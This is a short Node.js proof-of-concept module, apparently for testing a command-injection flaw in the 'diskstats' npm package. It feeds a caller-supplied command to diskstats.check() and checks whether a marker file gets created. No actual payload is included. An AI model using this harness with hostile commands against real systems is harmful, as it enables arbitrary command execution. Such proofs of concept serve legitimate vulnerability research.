const diskstats = require("diskstats");
const fs = require("fs");

function exploitFunction(command) {
  const path = "./diskstats";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  diskstats.check(command, () => {
    const file_exist = fs.existsSync(path);
    console.log("File exists:", file_exist);
    fs.unlinkSync(path);
  });
}

module.exports = { exploitFunction };